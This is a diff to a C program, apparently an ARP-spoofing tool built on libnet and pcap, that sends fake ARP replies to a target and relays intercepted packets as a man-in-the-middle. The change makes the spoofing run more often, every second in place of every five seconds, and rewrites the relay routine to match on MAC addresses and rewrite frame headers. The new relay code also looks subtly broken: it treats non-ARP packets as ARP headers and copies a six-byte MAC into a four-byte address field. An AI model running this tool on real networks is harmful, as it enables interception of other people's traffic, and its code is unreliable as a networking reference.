@@ -144,7 +144,7 @@ void *fake_arp_reply(void*argv)
 			exit(1);
 		}
 		printf("[+]Success to send Fake ARP Reply to %s\n",tharg->target_ip);
-		sleep(5);
+		sleep(1);
 	}
 	return 0;
 }
@@ -160,21 +160,18 @@ void receive_and_relay(u_char*usr,const struct pcap_pkthdr *header,const u_char*
 	struct ip_address*ipaddr=0;
 
 	ethhdr = (struct libnet_ethernet_hdr*)packet;
-	if(ntohs(ethhdr->ether_type)==ETHERTYPE_ARP)
+	if(memcmp(ethhdr->ether_shost,target.target_mac,6)==0 && 
+		memcmp(ethhdr->ether_dhost,mymac,6)==0)
 	{
-		arphdr = (struct libnet_arp_hdr*)(packet + SIZE_OF_ETHERNET);
-		ipaddr = (struct ip_address*)((char*)arphdr + SIZE_OF_ARP);
-		
-		char target_ip_net[4];
-		char sender_ip_net[4];
-		
-		inet_pton(AF_INET, target.target_ip, &target_ip_net);
-		inet_pton(AF_INET, target.sender_ip, &sender_ip_net);
-		if(memcmp(ipaddr->ar_sha,target_ip_net,4)==0 && 
-				memcmp(ipaddr->ar_tha,sender_ip_net,4)==0)
+		printf("[*]Relaying IP Packet");
+		memcpy(ethhdr->ether_shost,mymac,6);
+		memcpy(ethhdr->ether_dhost,target.sender_mac,6);
+		if(ntohs(ethhdr->ether_type)!=ETHERTYPE_ARP)
 		{
-			printf("[*]Relaying IP Packet");
-			memcpy(ethhdr->ether_shost,mymac,6);
+				arphdr = (struct libnet_arp_hdr*)(packet + SIZE_OF_ETHERNET);
+				ipaddr = (struct ip_address*)((char*)arphdr+SIZE_OF_ARP);
+				memcpy(ipaddr->ar_sha,mymac,6);
+				memcpy(ipaddr->ar_tpa,target.sender_mac,6);
 		}
 
 		if(pcap_sendpacket(handle,packet,header->len)==-1)
